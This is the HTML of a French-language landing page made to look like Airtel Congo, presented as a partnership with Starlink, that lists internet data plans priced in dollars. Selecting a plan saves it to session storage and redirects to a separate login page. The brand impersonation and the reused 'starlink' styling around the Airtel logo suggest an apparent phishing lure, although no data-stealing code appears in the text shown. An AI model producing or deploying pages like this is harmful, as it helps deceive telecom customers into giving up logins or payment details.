<!doctype html><html lang="fr"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Airtel Congo</title><link rel="stylesheet" href="styles.css"></head><body><main class="dp-root"><i class="dp-blob dp-blob-1"></i><i class="dp-blob dp-blob-2"></i><header class="dp-header"><div class="dp-logo-wrap"><b class="dp-starlink-wordmark">airtel</b></div><div class="dp-collab-center"><span class="dp-collab-text">En collaboration avec</span><b class="dp-starlink-wordmark">STARLINK</b></div><button class="dp-menu-btn"><span></span><span></span><span></span></button></header><section class="dp-main"><div class="dp-hero"><span class="dp-hero-badge">📶 Forfaits Internet</span><h1 class="dp-hero-title">Restez Connecté <span class="dp-hero-accent">Sans Limites</span></h1><p class="dp-hero-sub">Choisissez un forfait internet adapté à vos besoins.</p></div><div id="plans" class="dp-grid"></div><div class="dp-trust"><span class="dp-trust-item">⚡ Activation instantanée</span><i class="dp-trust-sep"></i><span class="dp-trust-item">🔒 Paiement sécurisé</span><i class="dp-trust-sep"></i><span class="dp-trust-item">📞 Support 24/7</span></div></section><footer class="dp-footer">© 2026 Airtel Congo. Tous droits réservés.</footer></main><script src="flow.js"></script><script>const plans=document.querySelector('#plans');plans.innerHTML=offers.map(o=>`<button class="dp-card ${o[6]?'dp-card--hot':''} ${o[7]?'dp-card--wide':''}" data-id="${o[0]}">${o[6]?`<b class="dp-badge">${o[6]}</b>`:''}<div class="dp-card-speed">${o[5]}</div><div class="dp-card-data"><b class="dp-card-amount">${o[1]}</b>${o[2]?`<span class="dp-card-unit">${o[2]}</span>`:''}</div><p class="dp-card-validity">Valide ${o[4]}</p><div class="dp-card-divider"></div><div class="dp-card-price"><small class="dp-card-currency">$</small><b class="dp-card-dollars">${o[3].toFixed(2)}</b></div><span class="dp-card-cta">Choisir ce forfait</span></button>`).join('');plans.onclick=e=>{const c=e.target.closest('[data-id]');if(c){sessionStorage.setItem('airtelOffer',c.dataset.id);location.href='login.html'}};</script></body></html>
